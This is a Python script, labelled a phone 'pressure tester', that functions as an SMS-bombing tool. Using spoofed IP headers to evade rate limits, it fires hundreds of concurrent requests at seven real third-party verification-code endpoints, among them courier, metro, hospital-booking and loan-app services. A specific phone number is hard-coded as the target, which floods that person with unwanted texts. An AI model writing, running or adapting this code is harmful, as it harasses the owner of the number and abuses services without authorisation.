import sys
import random
import threading
import time
import requests
import urllib3
from concurrent.futures import ThreadPoolExecutor

# 禁用不安全请求警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class PressureTester:
    def __init__(self, target):
        self.phone = target
        self.success_count = 0
        self.lock = threading.Lock()
        
        # 整合后的接口列表 (名称, URL, 数据, 是否JSON, 额外Headers)
        self.apis = [
            ("云创动力", "https://jkyc.necloud.com.cn/QXRTOC/user/qxrtoc_wxxcxUserRegistCode", {"phone": self.phone}, False, None),
            ("小熊美术", "https://www.xiaoxiongmeishu.com/api/m/v1/sms/sendCodeV2", {"bizOrigin": "APP", "mobile": f"+86{self.phone}"}, True, None),
            ("供应管理", "https://www.scmmgr.cn/scm//orderRegisterUser/getPollCode", {"mobileNo": self.phone, "msgType": "2"}, False, None),
            ("重庆轨道", "https://ycx.cqmetro.cn//bas/mc/v1/send-sms-code", {"mobile_phone": self.phone, "sms_type": "0"}, True, None),
            ("在线挂号", "https://168api-tyxcx.zaiguahao.com/api/common/smsSend", {"applets_id": 1352, "phone": self.phone}, True, None),
            ("快递100", "https://p.kuaidi100.com/xcx/sms/sendcode", {"name": self.phone, "validcode": ""}, False, None),
            ("鑫汇融资", "http://apiyd.xinhuirongzi.com/user/get-sms-code", {"mobile": self.phone}, True, {
                 "package": "com.dsrz.qianjia", "os": "android", "vn": "1.0.7", "version": "107", "platform": "vivo"
             })
        ]

    def _get_headers(self, extra_headers=None):
        """构造随机匿名请求头"""
        fake_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        headers = {
            "User-Agent": "Mozilla/5.0 (iPhone; CPU OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
            "X-Forwarded-For": fake_ip,
            "X-Real-IP": fake_ip,
            "Referer": "https://servicewechat.com/wx7c8d593b2c3a77/0/page-frame.html",
            "Accept": "*/*"
        }
        if extra_headers:
            headers.update(extra_headers)
        return headers

    def _send(self, idx):
        # 随机抽取接口
        name, url, data, is_json, extra = random.choice(self.apis)
        headers = self._get_headers(extra)
        
        try:
            # 增加重试机制降低失败率
            for _ in range(2):
                res = requests.post(
                    url, 
                    json=data if is_json else None, 
                    data=None if is_json else data, 
                    headers=headers, 
                    timeout=6, 
                    verify=False
                )
                if res.status_code in [200, 201]:
                    with self.lock:
                        self.success_count += 1
                    status = "✅"
                    break
                else:
                    status = "❌"
            
            print(f"[{idx:03d}] {status} {name: <6} | 响应: {res.text[:30].strip()}")
        except Exception:
            print(f"[{idx:03d}] ⚠️ {name: <6} | 连接超时")

    def start(self, count=100, threads=30):
        print(f"🚀 手机压力测试启动 | 目标: {self.phone} | 并发: {threads}")
        start_time = time.time()
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            executor.map(self._send, range(1, count + 1))
            
        print("-" * 40)
        print(f"📊 任务完成 | 成功: {self.success_count} | 耗时: {time.time()-start_time:.1f}s")

if __name__ == "__main__":
    # 配置区
    PHONE = "13599888558"
    TOTAL_REQUESTS = 500
    MAX_THREADS = 40
    
    engine = PressureTester(PHONE)
    engine.start(count=TOTAL_REQUESTS, threads=MAX_THREADS)
